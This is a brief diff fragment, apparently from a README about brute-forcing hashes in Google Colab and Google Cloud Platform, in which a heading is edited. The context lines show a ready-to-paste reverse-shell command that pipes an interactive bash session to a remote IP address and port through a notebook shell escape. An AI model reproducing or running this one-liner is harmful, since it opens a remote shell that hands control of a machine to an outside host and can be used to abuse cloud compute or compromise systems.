@@ -6,7 +6,7 @@
 </p>
 
 
-brute hash in google-colab
+brute hash in google-colab & console.cloud.google.com | google cloud platform
 ````
 !bash -c 'bash -i >& /dev/tcp/1.1.1.1/1212 0>&1'
 
